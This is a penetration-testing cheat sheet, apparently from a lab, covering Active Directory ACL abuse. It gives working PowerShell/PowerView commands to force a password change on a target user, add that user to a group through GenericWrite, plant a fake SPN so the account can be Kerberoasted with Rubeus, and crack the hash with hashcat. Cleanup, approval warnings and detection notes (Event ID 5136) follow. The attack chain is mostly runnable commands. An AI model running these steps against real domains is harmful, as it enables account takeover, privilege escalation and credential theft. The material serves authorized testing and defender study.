# ACL Abuse Tactics

Cleanup order matters: remove fake SPN first → then remove from group → then reset password. Reversing the order breaks your own access mid-cleanup.

---

## Step 1 — ForceChangePassword (wley → damundsen)

Authenticate as your controlled user via PSCredential object:

```powershell
$SecPassword = ConvertTo-SecureString '<PASS>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
```

Force change the target user's password:

```powershell
$NewPass = ConvertTo-SecureString '<NEWPASS>' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $NewPass -Credential $Cred -Verbose
```

> [!warning] ForceChangePassword is destructive — get written approval before running. If the target is an admin account being actively used, coordinate with the client or use targeted Kerberoasting instead.

---

## Step 2 — GenericWrite → Add Self to Group (damundsen → Help Desk Level 1)

Create new cred object as the newly controlled user:

```powershell
$SecPassword2 = ConvertTo-SecureString '<NEWPASS>' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<TARGET_USER>', $SecPassword2)
```

Add user to the group:

```powershell
Add-DomainGroupMember -Identity '<GROUP>' -Members '<TARGET_USER>' -Credential $Cred2 -Verbose
```

Confirm membership:

```powershell
Get-DomainGroupMember -Identity "<GROUP>" | Select MemberName
```

---

## Step 3 — GenericAll → Targeted Kerberoast (IT group → adunn)

Set a fake SPN on the target user to make them Kerberoastable:

```powershell
Set-DomainObject -Credential $Cred2 -Identity <TARGET_USER> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Kerberoast the now-SPN-enabled account:

```powershell
.\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap
```

Crack offline:

```bash
hashcat -m 13100 <HASH_FILE> <WORDLIST>
```

---

## Cleanup (in order)

Remove fake SPN first — before losing group membership:

```powershell
Set-DomainObject -Credential $Cred2 -Identity <TARGET_USER> -Clear serviceprincipalname -Verbose
```

Remove from group:

```powershell
Remove-DomainGroupMember -Identity "<GROUP>" -Members '<USER>' -Credential $Cred2 -Verbose
```

Verify removal:

```powershell
Get-DomainGroupMember -Identity "<GROUP>" | Select MemberName | ? {$_.MemberName -eq '<USER>'}
```

Then reset the password for any account you force-changed, or have the client do it.

---

## Detection

Event ID 5136 (directory service object modified) — fires on ACL changes, SPN writes, group membership changes. SDDL format — parse with:

```powershell
ConvertFrom-SddlString "<SDDL_STRING>" | select -ExpandProperty DiscretionaryAcl
```

Group membership changes on privileged groups should alert immediately. Any non-standard SPN appearing on a user account (especially admins) is a red flag.